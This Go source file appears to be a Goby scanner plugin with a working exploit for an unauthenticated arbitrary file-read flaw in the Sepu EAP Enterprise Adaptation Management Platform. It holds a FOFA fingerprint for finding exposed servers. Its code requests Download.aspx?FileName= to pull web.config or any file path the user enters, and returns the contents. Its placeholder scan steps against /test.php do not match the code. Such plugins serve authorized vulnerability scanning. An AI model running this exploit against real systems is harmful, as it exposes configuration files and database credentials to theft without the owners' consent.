package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Sepu EAP Enterprise Adaptation Management Platform /IDWebSoft/Common/Handler/Download.aspx File Read Vulnerability",
    "Description": "<p>Saipu EAP Enterprise Adaptation Management Platform is a digital management system specially designed for real estate enterprises, aiming to help enterprises optimize business processes, improve management efficiency and improve customer experience. The system integrates multiple modules such as project management, sales management, customer relationship management, financial management, report analysis, etc., which can meet the management needs of different levels and departments of enterprises. By adopting a flexible configuration mechanism, the system can be customized according to the needs of different enterprises to achieve a perfect fit with the enterprise's business.</p>",
    "Product": "Sail-EAP-Ent-Adaptation-MP",
    "Homepage": "http://www.chinasapmail.net/",
    "DisclosureDate": "2024-10-31",
    "PostTime": "2024-11-01",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"IDWebSoft/\" && body!=\"邦泰\"",
    "GobyQuery": "body=\"IDWebSoft/\" && body!=\"邦泰\"",
    "Level": "1",
    "Impact": "<p>Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143426491?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "赛普EAP企业适配管理平台 /IDWebSoft/Common/Handler/Download.aspx 文件读取漏洞",
            "Product": "赛普EAP企业适配管理平台",
            "Description": "<p>赛普EAP企业适配管理平台，是一款专门为房地产企业打造的数字化管理系统，旨在帮助企业实现业务流程的优化、管理效率的提升和客户体验的改善。系统集成了项目管理、销售管理、客户关系管理、财务管理、报表分析等多个模块，能够满足企业不同层级、不同部门的管理需求。通过采用灵活的配置机制，该系统可以根据不同企业的需求进行定制化配置，实现与企业业务的完美契合。</p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Sepu EAP Enterprise Adaptation Management Platform /IDWebSoft/Common/Handler/Download.aspx File Read Vulnerability",
            "Product": "Sail-EAP-Ent-Adaptation-MP",
            "Description": "<p>Saipu EAP Enterprise Adaptation Management Platform is a digital management system specially designed for real estate enterprises, aiming to help enterprises optimize business processes, improve management efficiency and improve customer experience. The system integrates multiple modules such as project management, sales management, customer relationship management, financial management, report analysis, etc., which can meet the management needs of different levels and departments of enterprises. By adopting a flexible configuration mechanism, the system can be customized according to the needs of different enterprises to achieve a perfect fit with the enterprise's business.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Unauthenticated attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	postOrGet_zasqefasf123asdfafe1412afdawaq := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		getRequestConfig := httpclient.NewGetRequestConfig("/IDWebSoft/Common/Handler/Download.aspx?FileName=" + fileUrl + "&FileTitle=")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle="
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"web.config": "<appSettings>",
			}
			// 函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web_info": {"web.config", "<appSettings>"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
